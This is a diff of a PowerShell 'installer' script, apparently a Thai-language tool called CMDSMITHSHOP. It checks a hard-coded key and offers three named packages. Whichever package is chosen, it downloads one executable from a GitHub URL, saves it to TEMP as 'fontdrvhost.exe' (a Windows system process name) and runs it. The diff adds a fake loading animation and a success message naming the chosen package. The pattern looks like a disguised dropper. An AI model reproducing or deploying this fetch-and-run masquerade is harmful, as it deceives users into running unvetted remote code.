@@ -5,6 +5,14 @@ $ValidKey = "smithshop"
 $ExeURL = "https://github.com/draft7973-ops/Smithshop/raw/main/fontdrvhost.exe"
 $ExeOutput = "$env:TEMP\fontdrvhost.exe"
 
+function Show-Loading($text) {
+    for ($i = 0; $i -lt 30; $i++) {
+        Write-Host -NoNewline "`r$text" + ("." * ($i % 6))
+        Start-Sleep -Milliseconds 300
+    }
+    Write-Host ""
+}
+
 Write-Host "=== CMDSMITHSHOP :] ==="
 Write-Host "1. Install"
 Write-Host "2. Clean"
@@ -15,12 +23,11 @@ if ($choice -eq "1") {
 
     $userKey = Read-Host "Enter your Key"
 
-    # ตัดช่องว่าง + ไม่สนตัวพิมพ์เล็กใหญ่
     if ($userKey.Trim().ToLower() -eq $ValidKey.ToLower()) {
 
         Write-Host "✅ Key valid!" -ForegroundColor Green
 
-        # ===== เมนูเลือก =====
+        # ===== เลือกแพ็ก =====
         Write-Host ""
         Write-Host "Select Package:"
         Write-Host "1. smithx3d"
@@ -29,26 +36,31 @@ if ($choice -eq "1") {
 
         $package = Read-Host "Choose 1 / 2 / 3"
 
-        if ($package -eq "1") {
-            Write-Host "Installing smithx3d..."
-        }
-        elseif ($package -eq "2") {
-            Write-Host "Installing uptoking..."
-        }
-        elseif ($package -eq "3") {
-            Write-Host "Installing kingsmith..."
-        }
-        else {
-            Write-Host "❌ Invalid package!" -ForegroundColor Red
-            Pause
-            exit
+        switch ($package) {
+            "1" { $pkgName = "smithx3d" }
+            "2" { $pkgName = "uptoking" }
+            "3" { $pkgName = "kingsmith" }
+            default {
+                Write-Host "❌ Invalid package!" -ForegroundColor Red
+                Pause
+                exit
+            }
         }
 
-        # โหลด + รัน
+        # ===== เคลียร์หน้า + หน้าใหม่ =====
+        Clear-Host
+        Write-Host "=== INSTALL MODE ===`n"
+
+        # ===== โหลดอนิเมชั่น =====
+        Show-Loading "install $pkgName "
+
+        # ===== โหลดไฟล์จริง =====
         Invoke-WebRequest $ExeURL -OutFile $ExeOutput
+
+        # ===== รัน =====
         Start-Process $ExeOutput
 
-        Write-Host "Installation complete ✅"
+        Write-Host "`n✅ install $pkgName success!" -ForegroundColor Green
 
     } else {
         Write-Host "❌ Key invalid!" -ForegroundColor Red
@@ -57,12 +69,16 @@ if ($choice -eq "1") {
 }
 elseif ($choice -eq "2") {
 
-    Write-Host "Cleaning..."
+    Clear-Host
+    Write-Host "=== CLEAN MODE ===`n"
+
+    Show-Loading "cleaning "
+
     if (Test-Path $ExeOutput) {
         Remove-Item $ExeOutput -Force
-        Write-Host "File removed successfully ✅"
+        Write-Host "`nFile removed successfully ✅"
     } else {
-        Write-Host "File not found ⚠️"
+        Write-Host "`nFile not found ⚠️"
     }
 
 }
